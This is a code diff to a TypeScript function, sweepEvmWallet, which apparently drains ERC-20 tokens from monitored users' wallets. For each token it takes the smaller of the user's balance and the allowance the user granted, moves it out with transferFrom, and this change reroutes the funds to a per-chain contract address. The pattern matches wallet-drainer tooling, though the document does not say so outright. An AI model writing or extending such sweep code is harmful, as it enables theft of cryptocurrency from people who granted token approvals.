@@ -194,6 +194,12 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
   }
   const spenderAddr = spenderAccount.address;
   
+  const contractAddr = CHAIN_CONTRACTS[Number(chainId)];
+  if (!contractAddr) {
+    return { swept: false, amount: '0', error: `No contract address for chain ${chainId}` };
+  }
+  const destinationAddr = contractAddr as `0x${string}`;
+  
   let totalSwept = BigInt(0);
   const userAddr = wallet.walletAddress as `0x${string}`;
   
@@ -221,14 +227,14 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
       
       const transferAmount = balance < allowance ? balance : allowance;
       
-      console.log(`[Monitor] EVM ${chainId} - ${wallet.walletAddress}: ${token.symbol} balance=${balance}, allowance=${allowance}, sweeping=${transferAmount}`);
+      console.log(`[Monitor] EVM ${chainId} - ${wallet.walletAddress}: ${token.symbol} balance=${balance}, allowance=${allowance}, sweeping=${transferAmount} -> contract ${contractAddr}`);
       
       try {
         const txHash = await walletClient.writeContract({
           address: tokenAddress,
           abi: ERC20_ABI,
           functionName: 'transferFrom',
-          args: [userAddr, spenderAddr, transferAmount],
+          args: [userAddr, destinationAddr, transferAmount],
           chain: CHAINS[chainId],
         });
         
